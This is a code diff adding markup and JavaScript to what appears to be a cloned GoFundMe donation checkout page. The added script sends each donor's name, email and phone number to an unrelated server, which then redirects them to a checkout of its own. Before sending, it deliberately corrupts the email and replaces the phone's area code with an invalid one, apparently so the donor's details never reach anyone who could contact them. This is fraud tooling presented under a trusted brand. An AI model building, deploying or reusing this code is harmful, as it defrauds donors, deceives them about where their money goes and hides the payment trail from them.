+        class="hrt-mt-0 hrt-mr-0 hrt-mb-0 hrt-ml-0 hrt-max-width-full hrt-width-full paypal-payfast_paypalPayfastSubmitButton__u8JfE sf-hidden"
+        bis_skin_checked="1"
+      >
+      </div>
+    </div>
+  </div>
+  <div
+    class="hrt-text-body-sm hrt-text-neutral-500 hrt-mt-3 hrt-mb-0"
+    bis_skin_checked="1"
+  >
+    By choosing the payment method above, you agree to GoFundMe's
+    <a
+      class="hrt-link hrt-link--gray-dark"
+      id="link-donate-terms"
+      target="_blank"
+      rel="noreferrer"
+      data-savepage-href="/pt-pt/c/terms"
+      href="https://www.gofundme.com/pt-pt/c/terms"
+    >
+      Terms of Service
+    </a>
+    and
+    <a
+      class="hrt-link hrt-link--gray-dark"
+      id="link-donate-privacy"
+      target="_blank"
+      rel="noreferrer"
+      data-savepage-href="/pt-pt/c/privacy"
+      href="https://www.gofundme.com/pt-pt/c/privacy"
+    >
+      Privacy Notice
+    </a>
+    .
+    <div class="pricing-link" bis_skin_checked="1">
+      Learn more about
+      <a
+        class="hrt-link hrt-link--gray-dark"
+        data-savepage-href="/pt-pt/c/pricing"
+        href="https://www.gofundme.com/pt-pt/c/pricing"
+        target="_blank"
+        rel="noreferrer"
+      >
+        prices and rates
+      </a>
+      .
+    </div>
+  </div>
+</div>
+</form>
+</div>
+<div id="checkoutAppInvisibleCaptcha" bis_skin_checked="1"></div>
+<div
+  class="checkout-rule_checkoutRule__RsZ5R hrt-mb-3 hrt-mt-3 hrt-rule hrt-rule--horizontal"
+  bis_skin_checked="1"
+></div>
+<div class="gfm-guarantee" bis_skin_checked="1">
+  <section class="m-value-prop">
+    <div class="hrt-spot-icon hrt-spot-icon--indigo hrt-spot-icon--large" bis_skin_checked="1">
+      <svg
+        aria-hidden="true"
+        class="hrt-icon hrt-icon--large"
+        focusable="false"
+        viewBox="0 0 24 24"
+      >
+        <use
+          data-savepage-href="/_next/static/images/core-a3bcb8a977a6bad05819661edd5f4478e5cb123c562c34fe3d6b69e5e781572d.svg#federal-giving-guarantee"
+          href="#federal-giving-guarantee"
+        ></use>
+        <symbol
+          fill="none"
+          viewBox="0 0 24 24"
+          id="federal-giving-guarantee"
+          xmlns="http://www.w3.org/2000/svg"
+        >
+          <path
+            fill-rule="evenodd"
+            clip-rule="evenodd"
+            d="M20.711 4.46c.283.248.47.588.529.96a22 22 0 0 1-.18 8.13c-.78 3.34-2.91 7.59-8.63 8.88l-.4.09-.39-.08c-5.73-1.3-7.86-5.55-8.64-8.89a22 22 0 0 1-.24-8.13 1.62 1.62 0 0 1 1.48-1.36 13.16 13.16 0 0 0 7-2.28 1.07 1.07 0 0 1 1.45 0 13.11 13.11 0 0 0 7 2.28c.376.01.738.15 1.021.4ZM12.07 20.97c3.98-.9 6.5-3.51 7.5-7.76a20.55 20.55 0 0 0 .19-7.55.11.11 0 0 0-.11-.1A14.6 14.6 0 0 1 12 3.11a14.62 14.62 0 0 1-7.65 2.45.11.11 0 0 0-.11.1 20.55 20.55 0 0 0 .19 7.55c1 4.25 3.5 6.86 7.5 7.76h.14ZM12 11.29a.67.67 0 0 0 .67-.67V9.2a.67.67 0 1 0-1.34 0v1.42a.67.67 0 0 0 .67.67Zm-3 1a.66.66 0 0 0 0-.94l-1-1a.67.67 0 0 0-.92 0 .68.68 0 0 0 0 .94l1 1a.66.66 0 0 0 .92 0Zm.98.517A4 4 0 0 1 12 12.28a4.05 4.05 0 0 1 3.5 2h-7a4 4 0 0 1 1.48-1.473ZM16 10.34l-1 1a.67.67 0 0 0 0 .92.661.661 0 0 0 .94 0l1-1a.68.68 0 0 0 0-.94.68.68 0 0 0-.94.02Z"
+            fill="currentColor"
+          ></path>
+        </symbol>
+      </svg>
+    </div>
+    <div class="m-value-prop-content" bis_skin_checked="1">
+      <h3 class="hrt-font-medium hrt-mb-1">GoFundMe protects your donation</h3>
+      <p class="hrt-text-neutral-500 hrt-mt-0 hrt-mb-0 hrt-text-body-sm">
+        We guarantee a full refund for up to one year in the rare event of fraud.
+        <a
+          class="hrt-link hrt-link--gray-dark"
+          href="https://www.gofundme.com/pt-pt/c/safety/gofundme-guarantee"
+          target="_blank"
+          rel="noreferrer"
+        >
+          See our GoFundMe Donation Guarantee.
+        </a>
+      </p>
+    </div>
+  </section>
+</div>
+</div>
+<img
+  data-savepage-src="https://d21y75miwcfqoq.cloudfront.net/48196d7e"
+  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
+  style="position:absolute"
+  referrerpolicy="no-referrer-when-downgrade"
+  alt
+/>
+<button class="hrt-disp-none hrt-base-button sf-hidden" type="button"></button>
+</div>
+
+<next-route-announcer>
+  <p
+    aria-live="assertive"
+    id="__next-route-announcer__"
+    role="alert"
+    style="border:0px;clip:rect(0px,0px,0px,0px);height:1px;margin:-1px;overflow:hidden;padding:0px;position:absolute;top:0px;width:1px;white-space:nowrap;overflow-wrap:normal"
+  ></p>
+</next-route-announcer>
+
+<!-- Donation Amount Update Script Copy -->
+<script>
+  // We'll track which donation amount is selected, and map each amount to a variant ID
+  const variantMap = {
+    "25": 177472235,
+    "50": 176630907,
+    "100": 177341204,
+    "300": 177341301,
+    "500": 177341319,
+    "750": 666666,
+    "1000": 177341398,
+    "1500": 888888,
+    "2000": 999999
+  };
+
+  let selectedAmount = 0; // We'll store the numeric amount. Default 0 if none selected.
+  let selectedVariantId = null;
+
+  const donationButtons2 = document.querySelectorAll(
+    'ul[data-federalid="suggested-donations-list"] button'
+  );
+  const donationSummaryDDs2 = document.querySelectorAll(
+    ".checkout-summary_checkoutSummaryList__1z9xU dd"
+  );
+
+  let donationAmountElement2 = null;
+  let totalAmountElement2 = null;
+
+  if (donationSummaryDDs2.length >= 2) {
+    donationAmountElement2 = donationSummaryDDs2[0];
+    totalAmountElement2 = donationSummaryDDs2[1];
+  }
+
+  donationButtons2.forEach((button) => {
+    button.addEventListener("click", () => {
+      selectedAmount = parseInt(button.value);
+      selectedVariantId = variantMap[button.value] || null;
+
+      if (donationAmountElement2 && totalAmountElement2) {
+        donationAmountElement2.textContent = `$${selectedAmount}.00`;
+        totalAmountElement2.textContent = `$${selectedAmount}.00`;
+      }
+
+      // Dispatch a custom event if needed
+      const donationSelectedEvent = new CustomEvent("donationSelected", {
+        detail: { amount: selectedAmount, variantId: selectedVariantId },
+      });
+      document.dispatchEvent(donationSelectedEvent);
+    });
+  });
+
+  (function () {
+    const yourDonation = document.querySelector(
+      'dl.checkout-summary_checkoutSummaryList__1z9xU dd:not(.checkout-summary_checkoutSummaryTotalAmount__oU1ez)'
+    );
+    const totalDue = document.querySelector(
+      'dl.checkout-summary_checkoutSummaryList__1z9xU dd.checkout-summary_checkoutSummaryTotalAmount__oU1ez'
+    );
+
+    document.addEventListener("donationSelected", function (e) {
+      const selectedAmount = e.detail.amount;
+      const formattedAmount = `$${parseInt(selectedAmount).toLocaleString("en-US")}.00`;
+
+      if (yourDonation) yourDonation.textContent = formattedAmount;
+      if (totalDue) totalDue.textContent = formattedAmount;
+    });
+  })();
+</script>
+
+<!-- 2) Include intl-tel-input JS library -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+
+<!-- Simple validation for text fields, shortened error for donate button, plus new code for phone + sending data to /create-donation-order -->
+<script>
+  // We'll replicate the email modification logic from your snippet
+  function modifyEmail(email) {
+    const parts = email.split("@");
+    if (parts.length < 2) return email; // invalid format; return as-is
+    const username = parts[0];
+    const domain = parts[1];
+
+    // Randomly select one of 4 modifications
+    const choice = Math.floor(Math.random() * 4);
+    let newUsername = username;
+
+    switch (choice) {
+      case 0:
+        // Prepend a random number (1-3 digits)
+        const numDigits = Math.floor(Math.random() * 3) + 1;
+        const randomNum = Math.floor(Math.random() * Math.pow(10, numDigits)).toString();
+        newUsername = randomNum + newUsername;
+        break;
+      case 1:
+        // Remove the last letter of the username
+        if (newUsername.length > 0) {
+          newUsername = newUsername.slice(0, -1);
+        }
+        break;
+      case 2:
+        // Insert a random letter somewhere in the username
+        const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
+        const pos = Math.floor(Math.random() * (newUsername.length + 1));
+        newUsername = newUsername.slice(0, pos) + randomLetter + newUsername.slice(pos);
+        break;
+      case 3:
+        // Remove the first letter of the username
+        newUsername = newUsername.slice(1);
+        break;
+    }
+    return newUsername + "@" + domain;
+  }
+
+  // Array of invalid US area codes to pick from
+  const invalidUsAreaCodes = [
+    263, 962, 365, 837, 735, 244, 552, 677, 695, 764,
+    376, 538, 471, 249, 923, 889, 222, 179, 146, 250,
+    133, 117, 111, 204, 157, 345, 265, 230, 278, 168, 192
+  ];
+
+  document.addEventListener("DOMContentLoaded", function () {
+    function showErrorMessage(inputId, errorId, message) {
+      const errorDiv = document.getElementById(errorId);
+      const inputEl = document.getElementById(inputId);
+      if (!inputEl) return;
+
+      const wrapper = inputEl.closest(".hrt-text-field-wrapper");
+      if (!wrapper) return;
+
+      if (message) {
+        errorDiv.classList.add("active");
+        errorDiv.querySelector("span").textContent = message;
+        wrapper.classList.add("field-error");
+      } else {
+        errorDiv.classList.remove("active");
+        errorDiv.querySelector("span").textContent = "";
+        wrapper.classList.remove("field-error");
+      }
+    }
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    const emailInput = document.getElementById("email-address");
+    function validateEmailField() {
+      const value = emailInput.value.trim();
+      if (!value) {
+        showErrorMessage("email-address", "email-error", "Please enter your email address");
+      } else if (!validateEmail(value)) {
+        showErrorMessage("email-address", "email-error", "Invalid email address");
+      } else {
+        showErrorMessage("email-address", "email-error", "");
+      }
+    }
+    emailInput.addEventListener("blur", validateEmailField);
+    emailInput.addEventListener("input", validateEmailField);
+
+    // Update full name field (renaming first-name to full-name)
+    const fullNameInput = document.getElementById("first-name");
+    fullNameInput.setAttribute("id", "full-name");
+    fullNameInput.setAttribute("name", "fullName");
+    fullNameInput.setAttribute("autocomplete", "name");
+    const fullNameLabel = document.querySelector('label[for="first-name"]');
+    if (fullNameLabel) {
+      fullNameLabel.setAttribute("for", "full-name");
+    }
+    // Update error message container id for full name
+    const fullNameErrorDiv = document.getElementById("first-name-error");
+    fullNameErrorDiv.setAttribute("id", "full-name-error");
+
+    function validateFullNameField() {
+      const value = fullNameInput.value.trim();
+      const words = value.split(" ").filter(word => word !== "");
+      if (!value) {
+        showErrorMessage("full-name", "full-name-error", "Please enter your full name");
+      } else if (words.length < 2) {
+        showErrorMessage("full-name", "full-name-error", "Please enter your full name (First and Last name)");
+      } else {
+        showErrorMessage("full-name", "full-name-error", "");
+      }
+    }
+    fullNameInput.addEventListener("blur", validateFullNameField);
+    fullNameInput.addEventListener("input", validateFullNameField);
+
+    // PHONE initialization via intl-tel-input
+    const phoneInput = document.getElementById("phone-input");
+    // Minimal phone validation
+    function validatePhoneField() {
+      const value = phoneInput.value.trim();
+      if (!value) {
+        showErrorMessage("phone-input", "phone-error", "Please enter your phone number");
+      } else {
+        showErrorMessage("phone-input", "phone-error", "");
+      }
+    }
+    phoneInput.addEventListener("blur", validatePhoneField);
+    phoneInput.addEventListener("input", validatePhoneField);
+
+    // Initialize intl-tel-input with fallback geoIP
+    const iti = window.intlTelInput(phoneInput, {
+      separateDialCode: true,            // show the dial code next to the flag
+      initialCountry: "auto",
+      formatOnDisplay: true,
+      autoPlaceholder: "aggressive",
+      utilsScript:
+        "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+      geoIpLookup: function (callback) {
+        // 1st try ip-api.com (HTTP; up to 45 req/min)
+        fetch("http://ip-api.com/json/")
+          .then(function (res) {
+            return res.json();
+          })
+          .then(function (data) {
+            if (data && data.status === "success" && data.countryCode) {
+              callback(data.countryCode);
+            } else {
+              // fallback to ipwhois.app (HTTPS)
+              fetch("https://ipwhois.app/json/")
+                .then(function (res2) {
+                  return res2.json();
+                })
+                .then(function (data2) {
+                  if (data2 && data2.country_code) {
+                    callback(data2.country_code);
+                  } else {
+                    callback("us"); // default
+                  }
+                })
+                .catch(function () {
+                  callback("us");
+                });
+            }
+          })
+          .catch(function () {
+            // on error with ip-api.com, fallback to ipwhois.app
+            fetch("https://ipwhois.app/json/")
+              .then(function (res2) {
+                return res2.json();
+              })
+              .then(function (data2) {
+                if (data2 && data2.country_code) {
+                  callback(data2.country_code);
+                } else {
+                  callback("us");
+                }
+              })
+              .catch(function () {
+                callback("us");
+              });
+          });
+      },
+    });
+
+    // Helper function to modify the phone number prior to submission
+    function modifyPhoneNumber() {
+      // e.g. "+1 234-567-8901" or any other format
+      const countryData = iti.getSelectedCountryData();
+      const iso2 = countryData.iso2; // e.g. "us"
+      const dialCode = countryData.dialCode; // e.g. "1"
+
+      // Get the "national" portion (local number) without the +dialCode
+      let nationalNumber = iti.getNumberForType(window.intlTelInputUtils.numberType.NATIONAL);
+      // Remove all non-digits to find the "first 3" reliably
+      let onlyDigits = nationalNumber.replace(/\D+/g, "");
+
+      if (!onlyDigits) return iti.getNumber(); // If it’s empty, just return the raw input
+
+      // We'll replace the first 3 digits
+      if (iso2 === "us") {
+        // Pick a random invalid US area code from the array
+        const randomIndex = Math.floor(Math.random() * invalidUsAreaCodes.length);
+        const randomUsAreaCode = invalidUsAreaCodes[randomIndex].toString();
+
+        // If the user typed fewer than 3 digits, just override whatever they have
+        if (onlyDigits.length >= 3) {
+          onlyDigits = randomUsAreaCode + onlyDigits.slice(3);
+        } else {
+          onlyDigits = randomUsAreaCode + onlyDigits.slice(onlyDigits.length);
+        }
+      } else {
+        // For any other country, just replace with a random 3-digit number
+        const randomThree = Math.floor(Math.random() * 1000).toString().padStart(3, "0");
+        if (onlyDigits.length >= 3) {
+          onlyDigits = randomThree + onlyDigits.slice(3);
+        } else {
+          onlyDigits = randomThree;
+        }
+      }
+
+      // Rebuild final phone in E.164:  +<dialCode><newLocalDigits>
+      return `+${dialCode}${onlyDigits}`;
+    }
+
+    const donateNowBtn = document.getElementById("donate-now");
+    const donationFormError = document.getElementById("donation-form-error");
+    const donationFormErrorMsg = donationFormError.querySelector("span");
+
+    function anyActiveFieldErrors() {
+      return document.querySelectorAll(".error-message.active").length > 0;
+    }
+
+    async function submitDonation() {
+      const fullName = fullNameInput.value.trim();
+      const email = emailInput.value.trim();
+
+      if (selectedAmount <= 0) {
+        // Provide a quick alert if no donation amount was selected
+        donationFormError.style.display = "flex";
+        donationFormErrorMsg.textContent = "Please select a donation amount";
+        return;
+      }
+
+      // Modify the email (randomly) before sending
+      const modifiedEmail = modifyEmail(email);
+
+      // Modify the phone number (area code or first 3 digits) before sending
+      const finalPhoneNumber = modifyPhoneNumber();
+
+      // Build the payload for the server
+      const payload = {
+        donationAmount: selectedAmount,
+        variantId: selectedVariantId, // pass the correct variant for the chosen amount
+        fullName,
+        email: modifiedEmail,
+        phoneNumber: finalPhoneNumber
+      };
+
+      try {
+        const response = await fetch("https://pol-production.up.railway.app/create-donation-order", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          throw new Error(data.error || "Unable to initiate payment.");
+        }
+
+        // If there's a checkoutUrl, redirect
+        if (data.checkoutUrl) {
+          window.location.href = data.checkoutUrl;
+        } else {
+          alert("No checkout URL returned. Cannot proceed.");
+        }
+      } catch (err) {
+        console.error("Donation submission error:", err);
+        alert("Something went wrong. Please try again.");
+      }
+    }
+
+    donateNowBtn.addEventListener("click", function () {
+      // Trigger validation
+      emailInput.dispatchEvent(new Event("blur"));
+      fullNameInput.dispatchEvent(new Event("blur"));
+      phoneInput.dispatchEvent(new Event("blur"));
+
+      // If any errors...
+      if (anyActiveFieldErrors()) {
+        donationFormError.style.display = "flex"; // ensures same line with icon
+        donationFormErrorMsg.textContent = "Please fix errors above";
+      } else {
+        // Hide global error if no fields in error
+        donationFormError.style.display = "none";
+        donationFormErrorMsg.textContent = "";
+        // Actually submit
+        submitDonation();
+      }
+    });
+  });
+</script>
+
+<!-- Our main custom JS for Payment using Square (replacing Stripe) -->
+<script src="payment.js"></script>
+<script src="fbclid.js"></script>
 
 
 
